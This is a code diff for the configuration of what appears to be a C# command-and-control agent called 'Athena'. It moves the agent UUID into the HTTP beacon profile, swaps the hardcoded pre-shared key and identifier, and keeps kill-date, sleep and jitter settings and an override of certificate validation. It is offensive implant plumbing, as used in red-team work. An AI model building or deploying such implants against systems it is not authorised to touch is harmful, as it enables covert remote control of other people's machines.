@@ -9,14 +9,12 @@ namespace Athena
     public class Config : IConfig
     {
         public IProfile profile { get; set; }
-        public static string uuid { get; set; }
         public DateTime killDate { get; set; }
         public int sleep { get; set; }
         public int jitter { get; set; }
 
         public Config()
         {
-            uuid = "e30399e3-d195-4091-b0b7-f9699e853d2f";
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
             this.killDate = kd;
             int sleep = int.TryParse("10", out sleep) ? sleep : 60;
@@ -28,6 +26,7 @@ namespace Athena
     }
     public class HTTP : IProfile
     {
+        public string uuid { get; set; }
         public string userAgent { get; set; }
         public string hostHeader { get; set; }
         public string getURL { get; set; }
@@ -56,8 +55,8 @@ namespace Athena
             this.proxyHost = ":";
             this.proxyPass = "";
             this.proxyUser = "";
-            this.psk = "++8DlT3B0BR7hBu3oYE+dbXf1j81/+ZwJYD3V7j3DbA=";
-
+            this.psk = "yztqjxlguUoK7u8iSdxsLmg7BHy4PI0B7NrLPaeFIpQ=";
+            this.uuid = "683050e0-bf57-4a06-af81-ccf085f0a8da";
             //Might need to make this configurable
             ServicePointManager.ServerCertificateValidationCallback =
                    new RemoteCertificateValidationCallback(
@@ -97,7 +96,7 @@ namespace Athena
 
             if (!string.IsNullOrEmpty(this.psk))
             {
-                this.crypt = new PSKCrypto(Config.uuid, this.psk);
+                this.crypt = new PSKCrypto(this.uuid, this.psk);
                 this.encrypted = true;
             }
 
@@ -113,7 +112,7 @@ namespace Athena
                 }
                 else
                 {
-                    json = await Misc.Base64Encode(Config.uuid + json);
+                    json = await Misc.Base64Encode(this.uuid + json);
                 }
 
                 HttpResponseMessage response;
